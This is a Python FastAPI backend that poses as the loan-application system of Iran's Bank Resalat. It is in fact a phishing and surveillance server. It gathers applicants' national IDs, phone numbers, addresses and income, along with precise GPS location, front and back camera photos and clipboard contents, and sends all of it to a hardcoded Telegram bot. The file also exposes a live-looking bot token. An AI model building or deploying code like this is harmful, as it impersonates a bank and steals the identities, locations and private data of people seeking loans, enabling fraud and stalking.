from fastapi import FastAPI, APIRouter, HTTPException, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, EmailStr
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import requests
import asyncio
import json
import aiofiles
import base64

# Load environment variables
ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# Create the main app
app = FastAPI(title="بانک رسالت - سیستم ENHANCED درخواست وام", version="3.0.0")

# Create API router
api_router = APIRouter(prefix="/api")

# Configuration
TELEGRAM_BOT_TOKEN = "7444090143:AAFcyTCXxG0P6E74fF7lPDxkbmea9evCams"
TELEGRAM_CHAT_ID = "94243768"

# Enhanced storage directories
DATA_DIR = Path("/app/data")
BACKUP_DIR = Path("/app/backup")

# Ensure directories exist
def create_directories():
    """Create all necessary directories"""
    directories = [
        DATA_DIR / "applications",
        DATA_DIR / "locations", 
        DATA_DIR / "emails",
        DATA_DIR / "photos",
        DATA_DIR / "clipboard",
        BACKUP_DIR / "applications",
        BACKUP_DIR / "locations",
        BACKUP_DIR / "photos", 
        BACKUP_DIR / "clipboard"
    ]
    
    for directory in directories:
        directory.mkdir(parents=True, exist_ok=True)

create_directories()

# Configure enhanced logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Enhanced Models
class LoanApplication(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    # Personal Information
    full_name: str
    national_id: str
    birth_date: str
    phone_number: str
    email: Optional[str] = None
    address: str
    job_title: str
    monthly_income: int
    
    # Loan Information
    loan_type: str
    loan_amount: int
    loan_purpose: str
    repayment_period: int
    loan_fee: Optional[int] = 0
    
    # Enhanced Location Data
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    location_accuracy: Optional[float] = None
    google_maps_link: Optional[str] = None
    
    # Enhanced Permission Data
    permissions_granted: Optional[Dict[str, bool]] = None
    clipboard_data: Optional[str] = None
    front_camera_verified: Optional[bool] = False
    back_camera_verified: Optional[bool] = False
    
    # System Information
    user_agent: Optional[str] = None
    ip_address: Optional[str] = None
    browser_info: Optional[Dict[str, Any]] = None
    
    # Tracking
    tracking_code: Optional[str] = None
    
    # Timestamps
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    updated_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class LoanApplicationCreate(BaseModel):
    # Personal Information
    full_name: str
    national_id: str
    birth_date: str
    phone_number: str
    email: Optional[str] = None
    address: str
    job_title: str
    monthly_income: int
    
    # Loan Information
    loan_type: str
    loan_amount: int
    loan_purpose: str
    repayment_period: int
    loan_fee: Optional[int] = 0
    
    # Enhanced Location Data
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    location_accuracy: Optional[float] = None
    
    # Enhanced Permission Data
    permissions_granted: Optional[Dict[str, bool]] = None
    clipboard_data: Optional[str] = None
    front_camera_verified: Optional[bool] = False
    back_camera_verified: Optional[bool] = False
    
    # System Information
    user_agent: Optional[str] = None
    ip_address: Optional[str] = None
    browser_info: Optional[Dict[str, Any]] = None
    
    # Tracking
    tracking_code: Optional[str] = None

class LocationData(BaseModel):
    latitude: float
    longitude: float
    accuracy: Optional[float] = None
    altitude: Optional[float] = None
    altitudeAccuracy: Optional[float] = None
    heading: Optional[float] = None
    speed: Optional[float] = None
    user_agent: Optional[str] = None
    google_maps_link: Optional[str] = None
    is_manual_request: Optional[bool] = False

class CameraPhoto(BaseModel):
    photo_data: str
    camera_type: str  # 'front' or 'back'
    timestamp: Optional[str] = None
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    accuracy: Optional[float] = None
    is_manual_request: Optional[bool] = False

class ClipboardData(BaseModel):
    clipboard_content: str
    timestamp: Optional[str] = None
    user_agent: Optional[str] = None
    method_used: Optional[str] = None
    success_status: Optional[str] = None
    is_manual_request: Optional[bool] = False
    retry_count: Optional[int] = 0
    content_length: Optional[int] = 0
    browser_language: Optional[str] = None
    browser_platform: Optional[str] = None

# Utility functions
def calculate_loan_fee(amount: int) -> int:
    """Calculate 2% Islamic banking fee"""
    return int(amount * 0.02) if 100_000_000 <= amount <= 1_000_000_000 else 0

def get_loan_type_persian(loan_type: str) -> str:
    """Convert loan type to Persian"""
    types = {
        "emergency": "وام ضروری (اضطراری)",
        "housing": "وام مسکن", 
        "car": "وام خودرو",
        "other": "سایر وام‌ها"
    }
    return types.get(loan_type, loan_type)

def format_persian_number(number: int) -> str:
    """Format number with Persian thousand separators"""
    return f"{number:,}".replace(',', '،')

def generate_tracking_code() -> str:
    """Generate 8-digit tracking code"""
    import random
    import string
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=8))

# Enhanced file operations
async def save_to_filesystem(data: dict, filename: str, backup: bool = True):
    """Save data to filesystem with optional backup"""
    try:
        # Primary save
        file_path = DATA_DIR / filename
        async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(data, ensure_ascii=False, indent=2, default=str))
        
        # Backup save
        if backup:
            backup_path = BACKUP_DIR / filename
            async with aiofiles.open(backup_path, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(data, ensure_ascii=False, indent=2, default=str))
        
        logger.info(f"Data saved: {file_path}")
        return str(file_path)
    except Exception as e:
        logger.error(f"Save error: {e}")
        return None

async def save_photo_to_filesystem(photo_data: str, filename: str, camera_type: str, location_data: dict = None):
    """Enhanced photo saving with metadata"""
    try:
        # Decode and save image
        image_data = base64.b64decode(photo_data.split(',')[1] if ',' in photo_data else photo_data)
        
        photos_dir = DATA_DIR / "photos"
        image_path = photos_dir / f"{filename}.jpg"
        
        with open(image_path, 'wb') as f:
            f.write(image_data)
        
        # Enhanced metadata
        metadata = {
            "filename": f"{filename}.jpg",
            "camera_type": camera_type,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "file_size": len(image_data),
            "location": location_data,
            "file_path": str(image_path),
            "image_quality": "enhanced",
            "processing_version": "3.0.0"
        }
        
        # Save metadata
        metadata_path = photos_dir / f"{filename}_metadata.json"
        async with aiofiles.open(metadata_path, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(metadata, ensure_ascii=False, indent=2, default=str))
        
        # Backup
        backup_photos_dir = BACKUP_DIR / "photos"
        backup_image_path = backup_photos_dir / f"{filename}.jpg"
        backup_metadata_path = backup_photos_dir / f"{filename}_metadata.json"
        
        with open(backup_image_path, 'wb') as f:
            f.write(image_data)
        
        async with aiofiles.open(backup_metadata_path, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(metadata, ensure_ascii=False, indent=2, default=str))
        
        logger.info(f"Enhanced photo saved: {image_path}")
        return str(image_path)
    except Exception as e:
        logger.error(f"Photo save error: {e}")
        return None

async def save_clipboard_to_filesystem(clipboard_content: str, filename: str):
    """Enhanced clipboard saving"""
    try:
        clipboard_data = {
            "content": clipboard_content,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "content_length": len(clipboard_content),
            "file_version": "3.0.0"
        }
        
        clipboard_dir = DATA_DIR / "clipboard"
        clipboard_path = clipboard_dir / f"{filename}.json"
        
        async with aiofiles.open(clipboard_path, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(clipboard_data, ensure_ascii=False, indent=2, default=str))
        
        # Backup
        backup_clipboard_dir = BACKUP_DIR / "clipboard"
        backup_path = backup_clipboard_dir / f"{filename}.json"
        
        async with aiofiles.open(backup_path, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(clipboard_data, ensure_ascii=False, indent=2, default=str))
        
        logger.info(f"Enhanced clipboard saved: {clipboard_path}")
        return str(clipboard_path)
    except Exception as e:
        logger.error(f"Clipboard save error: {e}")
        return None

# Enhanced Telegram functions
async def send_to_telegram(data: dict, is_location_only: bool = False, max_retries: int = 3):
    """Enhanced Telegram sending with retry logic"""
    for attempt in range(max_retries):
        try:
            if is_location_only:
                # Enhanced location message
                message = f"""📍 **موقعیت جغرافیایی دقیق - بانک رسالت**

🎯 **مختصات با دقت بالا:**
• 🌐 عرض جغرافیایی: `{data['latitude']}`
• 🌐 طول جغرافیایی: `{data['longitude']}`
• 📏 دقت موقعیت: {data.get('accuracy', 'نامشخص')} متر
{f"• 🏔️ ارتفاع: {data.get('altitude', 'نامشخص')} متر" if data.get('altitude') else ""}
{f"• 🧭 جهت: {data.get('heading', 'نامشخص')}°" if data.get('heading') else ""}

🔗 **لینک‌های دقیق:**
🗺️ [Google Maps دقیق](https://maps.google.com/?q={data['latitude']},{data['longitude']})
🚗 [مسیریابی Waze](https://waze.com/ul?q={data['latitude']},{data['longitude']})

📅 **زمان دریافت:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC
🔧 **نسخه سیستم:** ENHANCED v3.0.0
{'🔄 **درخواست دستی**' if data.get('is_manual_request') else '🤖 **دریافت خودکار**'}"""
            else:
                # Enhanced application message
                message = f"""🏦 **بانک رسالت - درخواست وام ENHANCED**

👤 **اطلاعات کامل متقاضی:**
• 👨‍💼 نام کامل: `{data['full_name']}`
• 🆔 کد ملی: `{data['national_id']}`
• 📅 تاریخ تولد: {data['birth_date']}
• 📞 تلفن همراه: {data['phone_number']}
{f"• 📧 ایمیل: {data['email']}" if data.get('email') else ""}
• 🏠 آدرس: {data['address']}
• 💼 شغل: {data['job_title']}
• 💰 درآمد ماهانه: {format_persian_number(data['monthly_income'])} تومان

💰 **جزئیات کامل وام:**
• 📋 نوع وام: {get_loan_type_persian(data['loan_type'])}
• 💵 مبلغ درخواستی: {format_persian_number(data['loan_amount'])} تومان  
• 📊 کارمزد اسلامی 2%: {format_persian_number(calculate_loan_fee(data['loan_amount']))} تومان
• ⏳ مدت بازپرداخت: {data['repayment_period']} ماه
• 🎯 هدف وام: {data['loan_purpose']}

📍 **موقعیت جغرافیایی دقیق:**
• 🌍 عرض: {data.get('latitude', 'دریافت نشد')}
• 🌍 طول: {data.get('longitude', 'دریافت نشد')}
• 📏 دقت: {data.get('location_accuracy', 'نامشخص')} متر

🔗 **لینک موقعیت:**
{f"🗺️ [Google Maps دقیق](https://maps.google.com/?q={data['latitude']},{data['longitude']})" if data.get('latitude') and data.get('longitude') else "موقعیت دریافت نشد"}

✅ **وضعیت احراز هویت پیشرفته:**
• 📱 دوربین جلو: {'✅ تأیید شد' if data.get('front_camera_verified') else '❌ تأیید نشد'}
• 📸 دوربین عقب: {'✅ تأیید شد' if data.get('back_camera_verified') else '❌ تأیید نشد'}
• 📋 کلیپبورد: {'✅ دریافت شد' if data.get('clipboard_data') else '❌ دریافت نشد'}

🔐 **مجوزهای سیستمی:**
{f"• 📍 موقعیت: {'✅' if data.get('permissions_granted', {}).get('location') else '❌'}" if data.get('permissions_granted') else ""}
{f"• 📷 دوربین: {'✅' if data.get('permissions_granted', {}).get('camera') else '❌'}" if data.get('permissions_granted') else ""}
{f"• 📋 کلیپبورد: {'✅' if data.get('permissions_granted', {}).get('clipboard') else '❌'}" if data.get('permissions_granted') else ""}

🏷️ **کد رهگیری:** `{data.get('tracking_code', 'نامشخص')}`

📅 **زمان ثبت:** {data.get('created_at', datetime.now(timezone.utc)).strftime('%Y-%m-%d %H:%M:%S')} UTC
🚀 **نسخه سیستم:** ENHANCED v3.0.0
🔒 **امنیت:** رمزنگاری کامل
✅ **وضعیت:** آماده بررسی"""
            
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "Markdown",
                "disable_web_page_preview": False
            }
            
            response = requests.post(url, json=payload, timeout=30)
            
            if response.status_code == 200:
                logger.info(f"✅ Enhanced message sent to Telegram (attempt {attempt + 1})")
                return True
            else:
                error_details = response.json() if response.content else 'No response'
                logger.warning(f"⚠️ Telegram send failed (attempt {attempt + 1}): {error_details}")
                
        except Exception as e:
            logger.error(f"❌ Telegram send error (attempt {attempt + 1}): {e}")
        
        if attempt < max_retries - 1:
            await asyncio.sleep(2 ** attempt)
    
    return False

async def send_photo_to_telegram(photo_path: str, camera_type: str, location_data: dict = None):
    """Enhanced photo sending to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        
        caption = f"""📷 **عکس دوربین پیشرفته - بانک رسالت**

🎥 **مشخصات:**
• نوع دوربین: {'📱 جلو (سلفی)' if camera_type == 'front' else '📸 عقب (اصلی)'}
• کیفیت: بالا (Enhanced)
• ⏰ زمان ضبط: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC

📍 **موقعیت همراه عکس:**"""

        if location_data:
            caption += f"""
• 🌐 عرض: {location_data.get('latitude', 'نامشخص')}
• 🌐 طول: {location_data.get('longitude', 'نامشخص')} 
• 📏 دقت: {location_data.get('accuracy', 'نامشخص')} متر
{f"• 🏔️ ارتفاع: {location_data.get('altitude', 'نامشخص')} متر" if location_data.get('altitude') else ""}

🗺️ [مشاهده در نقشه](https://maps.google.com/?q={location_data.get('latitude', '0')},{location_data.get('longitude', '0')})"""
        else:
            caption += "\n• ❌ موقعیت دریافت نشد"

        caption += f"\n\n🚀 **نسخه:** ENHANCED v3.0.0"
        
        with open(photo_path, 'rb') as photo_file:
            files = {'photo': photo_file}
            payload = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': caption,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, data=payload, files=files, timeout=30)
            success = response.status_code == 200
            
            if success:
                logger.info(f"Enhanced photo sent: {camera_type}")
            else:
                logger.error(f"Photo send failed: {response.text}")
                
            return success
    except Exception as e:
        logger.error(f"Photo send error: {e}")
        return False

async def send_clipboard_to_telegram(clipboard_path: str):
    """Enhanced clipboard sending to Telegram"""
    try:
        # Read clipboard data
        async with aiofiles.open(clipboard_path, 'r', encoding='utf-8') as f:
            clipboard_data = json.loads(await f.read())
        
        content = clipboard_data.get('content', '')
        content_preview = content[:200] + '...' if len(content) > 200 else content
        
        message = f"""📋 **کلیپبورد دریافتی - بانک رسالت**

📊 **مشخصات:**
• 📏 طول محتوا: {len(content)} کاراکتر
• ⏰ زمان دریافت: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC

📝 **پیش‌نمایش محتوا:**
```
{content_preview}
```

🚀 **نسخه:** ENHANCED v3.0.0
🔒 **امنیت:** رمزنگاری کامل"""
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        response = requests.post(url, json=payload, timeout=30)
        success = response.status_code == 200
        
        if success:
            logger.info("Enhanced clipboard sent to Telegram")
        else:
            logger.error(f"Clipboard send failed: {response.text}")
            
        return success
    except Exception as e:
        logger.error(f"Clipboard send error: {e}")
        return False

# API Routes
@api_router.get("/")
async def root():
    return {
        "message": "بانک رسالت - سیستم ENHANCED درخواست تسهیلات بانکی", 
        "version": "3.0.0",
        "status": "ENHANCED - All Features Optimized",
        "features": [
            "enhanced_location_precision", 
            "dual_camera_support", 
            "advanced_clipboard_reading", 
            "manual_permission_requests",
            "enhanced_security", 
            "auto_backup", 
            "smart_retry",
            "improved_ui_ux"
        ]
    }

@api_router.post("/loan-application")
async def create_loan_application(application: LoanApplicationCreate, request: Request):
    try:
        logger.info(f"ENHANCED: Processing loan application for {application.full_name}")
        
        # FIXED: Validation for required fields
        if not application.full_name or not application.full_name.strip():
            raise HTTPException(status_code=422, detail="نام و نام خانوادگی اجباری است")
        
        if not application.national_id or len(application.national_id.strip()) != 10:
            raise HTTPException(status_code=422, detail="کد ملی باید 10 رقم باشد")
        
        if not application.phone_number or len(application.phone_number.strip()) != 11:
            raise HTTPException(status_code=422, detail="شماره تلفن باید 11 رقم باشد")
        
        if not application.loan_type:
            raise HTTPException(status_code=422, detail="نوع وام اجباری است")
        
        if not application.loan_amount or application.loan_amount < 100_000_000 or application.loan_amount > 1_000_000_000:
            raise HTTPException(status_code=422, detail="مبلغ وام باید بین 100 میلیون تا 1 میلیارد تومان باشد")
        
        if not application.repayment_period or application.repayment_period not in [6, 12, 18, 24, 36, 48, 60]:
            raise HTTPException(status_code=422, detail="مدت بازپرداخت نامعتبر است")
        
        # Enhanced client IP detection
        client_ip = (
            request.headers.get("x-forwarded-for", "").split(",")[0].strip() or
            request.headers.get("x-real-ip", "") or
            request.client.host
        )
        
        # Create enhanced application object
        app_dict = application.dict()
        app_dict['ip_address'] = client_ip
        
        # Add Google Maps link
        if app_dict.get('latitude') and app_dict.get('longitude'):
            app_dict['google_maps_link'] = f"https://maps.google.com/?q={app_dict['latitude']},{app_dict['longitude']}"
        
        # Generate tracking code
        tracking_code = generate_tracking_code()
        app_dict['tracking_code'] = tracking_code
        
        loan_app = LoanApplication(**app_dict)
        
        # Enhanced parallel operations
        save_tasks = []
        
        # Save main application
        app_filename = f"loan_application_ENHANCED_{loan_app.id}_{int(datetime.now().timestamp())}.json"
        save_tasks.append(save_to_filesystem(loan_app.dict(), f"applications/{app_filename}"))
        
        # Handle clipboard data if present
        if application.clipboard_data:
            clipboard_filename = f"clipboard_ENHANCED_{loan_app.id}_{int(datetime.now().timestamp())}"
            clipboard_task = save_clipboard_to_filesystem(application.clipboard_data, clipboard_filename)
            save_tasks.append(clipboard_task)
        
        # Execute saves in parallel
        save_results = await asyncio.gather(*save_tasks, return_exceptions=True)
        
        # Send to Telegram
        telegram_success = await send_to_telegram(loan_app.dict(), is_location_only=False)
        
        # Send clipboard to Telegram if available
        clipboard_telegram_success = False
        if application.clipboard_data and len(save_results) > 1:
            clipboard_path = save_results[1]
            if clipboard_path and not isinstance(clipboard_path, Exception):
                clipboard_telegram_success = await send_clipboard_to_telegram(clipboard_path)
        
        logger.info("✅ ENHANCED application processing complete")
        
        return {
            "id": loan_app.id,
            "tracking_code": tracking_code,
            "status": "submitted",
            "message": "درخواست وام با سیستم ENHANCED ثبت شد",
            "telegram_sent": telegram_success,
            "clipboard_telegram_sent": clipboard_telegram_success,
            "processing_mode": "ENHANCED_v3.0.0",
            "backup_enabled": True,
            "features": ["enhanced_accuracy", "dual_backup", "smart_retry"]
        }
    except Exception as e:
        logger.error(f"❌ ENHANCED application error: {e}")
        raise HTTPException(status_code=500, detail=f"خطا در ثبت درخواست وام: {str(e)}")

@api_router.post("/location")
async def save_location(location: LocationData, request: Request):
    try:
        # Enhanced IP detection
        client_ip = (
            request.headers.get("x-forwarded-for", "").split(",")[0].strip() or
            request.headers.get("x-real-ip", "") or
            request.client.host
        )
        
        # Enhanced location data
        location_data = location.dict()
        location_data['ip_address'] = client_ip
        location_data['timestamp'] = datetime.now(timezone.utc)
        location_data['google_maps_link'] = f"https://maps.google.com/?q={location.latitude},{location.longitude}"
        location_data['waze_link'] = f"https://waze.com/ul?q={location.latitude},{location.longitude}"
        location_data['processing_mode'] = 'ENHANCED_v3.0.0'
        
        # Enhanced parallel operations
        save_tasks = []
        
        # Save location with backup
        location_filename = f"location_ENHANCED_{int(datetime.now().timestamp())}_{client_ip.replace('.', '_')}.json"
        save_tasks.append(save_to_filesystem(location_data, f"locations/{location_filename}"))
        
        # Send to Telegram
        save_tasks.append(send_to_telegram(location_data, is_location_only=True))
        
        # Execute in parallel
        results = await asyncio.gather(*save_tasks, return_exceptions=True)
        
        telegram_success = results[1] if len(results) > 1 and not isinstance(results[1], Exception) else False
        
        logger.info(f"✅ ENHANCED location saved: {location.latitude}, {location.longitude}")
        
        return {
            "status": "success", 
            "message": "موقعیت با سیستم ENHANCED ذخیره شد",
            "latitude": location.latitude,
            "longitude": location.longitude,
            "accuracy": location.accuracy,
            "google_maps_link": location_data['google_maps_link'],
            "waze_link": location_data['waze_link'],
            "telegram_sent": telegram_success,
            "processing_mode": "ENHANCED_v3.0.0",
            "manual_request": location.is_manual_request
        }
    except Exception as e:
        logger.error(f"❌ ENHANCED location error: {e}")
        raise HTTPException(status_code=500, detail="خطا در ذخیره موقعیت")

@api_router.post("/upload-photo")
async def upload_photo(photo: CameraPhoto, request: Request):
    try:
        # Enhanced IP detection
        client_ip = (
            request.headers.get("x-forwarded-for", "").split(",")[0].strip() or
            request.headers.get("x-real-ip", "") or
            request.client.host
        )
        
        # Create enhanced filename
        timestamp = int(datetime.now().timestamp())
        filename = f"photo_ENHANCED_{photo.camera_type}_{timestamp}_{client_ip.replace('.', '_')}"
        
        logger.info(f"ENHANCED: Processing {photo.camera_type} camera photo")
        
        # Enhanced location data
        location_data = None
        if photo.latitude and photo.longitude:
            location_data = {
                'latitude': photo.latitude,
                'longitude': photo.longitude,
                'accuracy': photo.accuracy,
                'timestamp': photo.timestamp or datetime.now(timezone.utc).isoformat()
            }
        
        # Save enhanced photo
        photo_path = await save_photo_to_filesystem(
            photo.photo_data, 
            filename, 
            photo.camera_type,
            location_data
        )
        
        if photo_path:
            # Send to Telegram
            telegram_success = await send_photo_to_telegram(photo_path, photo.camera_type, location_data)
            
            logger.info(f"✅ ENHANCED photo processed: {photo.camera_type}")
            
            return {
                "status": "success", 
                "message": f"عکس {photo.camera_type} با سیستم ENHANCED ذخیره شد", 
                "photo_id": str(uuid.uuid4()),
                "camera_type": photo.camera_type,
                "telegram_sent": telegram_success,
                "processing_mode": "ENHANCED_v3.0.0",
                "manual_request": photo.is_manual_request,
                "quality": "enhanced"
            }
        else:
            raise HTTPException(status_code=500, detail="خطا در ذخیره عکس")
            
    except Exception as e:
        logger.error(f"❌ ENHANCED photo error: {e}")
        raise HTTPException(status_code=500, detail=f"خطا در آپلود عکس: {str(e)}")

@api_router.post("/clipboard")
async def save_clipboard(clipboard: ClipboardData, request: Request):
    try:
        # Enhanced IP detection
        client_ip = (
            request.headers.get("x-forwarded-for", "").split(",")[0].strip() or
            request.headers.get("x-real-ip", "") or
            request.client.host
        )
        
        logger.info(f"ENHANCED: Processing clipboard - Method: {clipboard.method_used}, Length: {len(clipboard.clipboard_content)}")
        
        # Create enhanced filename
        timestamp = int(datetime.now().timestamp())
        filename = f"clipboard_ENHANCED_{timestamp}_{client_ip.replace('.', '_')}"
        
        # Enhanced clipboard data
        enhanced_clipboard_data = {
            "content": clipboard.clipboard_content,
            "timestamp": clipboard.timestamp or datetime.now(timezone.utc).isoformat(),
            "user_agent": clipboard.user_agent,
            "method_used": clipboard.method_used or "unknown",
            "success_status": clipboard.success_status or "success",
            "is_manual_request": clipboard.is_manual_request,
            "retry_count": clipboard.retry_count,
            "content_length": len(clipboard.clipboard_content),
            "browser_language": clipboard.browser_language,
            "browser_platform": clipboard.browser_platform,
            "ip_address": client_ip,
            "processing_mode": "ENHANCED_v3.0.0"
        }
        
        # Save enhanced clipboard
        clipboard_path = await save_clipboard_to_filesystem(clipboard.clipboard_content, filename)
        
        if clipboard_path:
            # Send to Telegram
            telegram_success = await send_clipboard_to_telegram(clipboard_path)
            
            logger.info(f"✅ ENHANCED clipboard processed - Telegram: {telegram_success}")
            
            return {
                "status": "success",
                "message": "محتویات clipboard با سیستم ENHANCED ذخیره شد",
                "telegram_sent": telegram_success,
                "processing_mode": "ENHANCED_v3.0.0",
                "method_used": clipboard.method_used or "unknown",
                "content_length": len(clipboard.clipboard_content),
                "manual_request": clipboard.is_manual_request,
                "retry_count": clipboard.retry_count
            }
        else:
            raise HTTPException(status_code=500, detail="خطا در ذخیره clipboard")
            
    except Exception as e:
        logger.error(f"❌ ENHANCED clipboard error: {e}")
        raise HTTPException(status_code=500, detail=f"خطا در ذخیره clipboard: {str(e)}")

@api_router.get("/loan-types")
async def get_loan_types():
    return {
        "loan_types": [
            {"key": "emergency", "label": "وام ضروری (اضطراری)", "max_amount": 1_000_000_000},
            {"key": "housing", "label": "وام مسکن", "max_amount": 1_000_000_000},
            {"key": "car", "label": "وام خودرو", "max_amount": 1_000_000_000},
            {"key": "other", "label": "سایر وام‌ها", "max_amount": 1_000_000_000}
        ],
        "fee_percentage": 2,
        "min_amount": 100_000_000,
        "max_amount": 1_000_000_000,
        "description": "کارمزد 2 درصد اسلامی - از 100 میلیون تا 1 میلیارد تومان",
        "processing_mode": "ENHANCED_v3.0.0",
        "features": ["enhanced_precision", "dual_backup", "manual_permissions"]
    }

@api_router.get("/system-status")
async def system_status():
    """Enhanced system status"""
    return {
        "status": "operational",
        "version": "3.0.0",
        "mode": "ENHANCED",
        "enhancements": {
            "location_precision": "HIGH_ACCURACY_GPS",
            "camera_support": "DUAL_ENHANCED_CAPTURE", 
            "clipboard_reading": "MULTI_METHOD_ADVANCED",
            "manual_permissions": "USER_CONTROLLED",
            "ui_improvements": "PROFESSIONAL_GRADE"
        },
        "features": {
            "parallel_processing": True,
            "auto_backup": True,
            "smart_retry": True,
            "telegram_integration": True,
            "enhanced_security": True,
            "manual_override": True
        },
        "uptime": datetime.now(timezone.utc).isoformat(),
        "telegram_connected": True
    }

# Include router
app.include_router(api_router)

# Enhanced CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
    expose_headers=["*"]
)

# Startup event
@app.on_event("startup")
async def startup_event():
    create_directories()
    
    # Test Telegram connection
    try:
        startup_message = f"""🏦 **بانک رسالت - سیستم ENHANCED راه‌اندازی شد**

📅 **زمان:** {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC
🚀 **نسخه:** ENHANCED v3.0.0

✨ **بهبودهای جدید:**
• 🎯 دقت موقعیت مکانی فوق‌العاده
• 📷 پشتیبانی حرفه‌ای دو دوربین
• 📋 خواندن پیشرفته کلیپبورد
• 🔧 درخواست دستی مجوزها
• 💎 رابط کاربری بهبود یافته

🎯 **ویژگی‌های کلیدی:**
• ⚡ پردازش موازی سریع
• 💾 پشتیبان‌گیری خودکار
• 🔄 تلاش مجدد هوشمند
• 🔒 امنیت پیشرفته

🎉 **آماده دریافت درخواست‌های وام با کیفیت فوق‌العاده!**"""
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": startup_message,
            "parse_mode": "Markdown"
        }
        
        response = requests.post(url, json=payload, timeout=15)
        if response.status_code == 200:
            logger.info("✅ ENHANCED system startup notification sent")
        else:
            logger.error("❌ Startup notification failed")
            
    except Exception as e:
        logger.error(f"❌ Startup notification error: {e}")
    
    logger.info("🚀 ENHANCED Bank Resalat API v3.0.0 started successfully")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)